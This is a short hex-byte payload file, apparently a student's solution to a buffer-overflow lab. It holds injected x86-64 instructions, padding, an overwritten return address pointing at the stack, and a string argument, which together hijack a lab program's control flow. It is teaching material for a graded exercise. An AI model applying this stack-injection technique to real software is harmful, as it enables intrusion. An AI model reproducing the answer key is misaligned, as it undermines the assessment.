/* Exploit code */
48 c7 c7 10 93 60 55    /* mov    $0x55609310,%rdi */
68 f1 27 40 00          /* pushq  $0x4027f1 */
c3                      /* retq */

/* Padding */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Address of our exploit code */
88 92 60 55 00 00 00 00

/* Padding - outside the stack frame */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Our string bytes */
35 64 32 31 36 36 30 65
